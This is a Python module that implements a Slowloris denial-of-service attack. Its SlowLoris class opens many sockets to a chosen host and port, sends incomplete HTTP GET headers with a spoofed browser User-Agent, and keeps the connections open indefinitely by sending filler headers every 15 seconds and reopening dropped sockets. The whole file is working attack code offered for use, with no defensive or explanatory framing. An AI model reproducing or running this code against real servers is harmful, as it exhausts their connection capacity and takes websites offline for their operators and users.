from traceback import print_exc
from random import randint
from time import sleep
import socket as s

class SlowLoris:
    TIMEOUT = 15
    def __init__(self, target, port, sockets=150):
        try:
            if not isinstance(target, str):
                raise TypeError('ERROR: the target argument must be of type str')
            if not isinstance(port, int):
                raise TypeError('ERROR: the port argument must be of type int')
            if not isinstance(sockets, int):
                raise TypeError('ERROR: the sockets argument must be of type int')

            self.target = target
            self.port = port
            self.sockets = sockets
        except Exception:
            print_exc()
    @classmethod
    def start(cls, target, port, sockets=150):
        try:
            if not isinstance(target, str):
                raise TypeError('ERROR: the target argument must be of type str')
            if not isinstance(port, int):
                raise TypeError('ERROR: the port argument must be of type int')
            if not isinstance(sockets, int):
                raise TypeError('ERROR: the sockets argument must be of type int')

            sockets_list = []
            print('Starting SlowLoris...')
            for i in range(sockets):
                print(f'Creating socket: {i}')

                socket = cls.__create_socket(target, port)

                http_header = f'GET /?{ randint(0,5000) } HTTP/1.1\r\n'.encode('utf-8')
                user_agent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393\r\n".encode('utf-8')
                language = "Accept-Language: en-US, en;q=1, it;q=0.5\r\n".encode('utf-8')

                socket.send(http_header)
                socket.send(user_agent)
                socket.send(language)

                sockets_list.append(socket)
            
            while True:
                try:
                    for socket in sockets_list:
                        print('Sending keep alive headers...')
                        try:
                            socket.send(f'Arge: { randint(0,5000) }\r\n'.encode('utf-8'))
                        except s.error:
                            sockets_list.remove(socket)
                    
                    for _ in range( sockets - len(sockets_list) ):
                        print('Recreating lost sockets...')
                        try:
                            socket = cls.__create_socket(target, port)

                            http_header = f'GET /?{ randint(0,5000) } HTTP/1.1\r\n'.encode('utf-8')
                            user_agent = "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393\r\n".encode('utf-8')
                            language = "Accept-Language: en-US, en;q=1, it;q=0.5\r\n".encode('utf-8')

                            socket.send(http_header)
                            socket.send(user_agent)
                            socket.send(language)
                            
                            sockets_list.append(socket)
                        except s.error as e:
                            print_exc()
                            break
                    print(f'Sleeping for {cls.TIMEOUT} seconds')
                    sleep(cls.TIMEOUT)
                except (KeyboardInterrupt, SystemExit, SystemError):
                    print('Stopping SlowLoris...')
                    break


        except Exception:
            print_exc()
    @classmethod
    def __create_socket(cls, address, port, https=False):
        socket = None
        try:
            socket = s.socket(s.AF_INET, s.SOCK_STREAM)
            socket.settimeout(5)
            if https:
                import ssl
                ssl.wrap_socket(socket)
            socket.connect((address, port))
        except Exception:
            print_exc()
        finally:
            return socket

if __name__ == '__main__':
    print('ERROR: this module cannot be executed directly')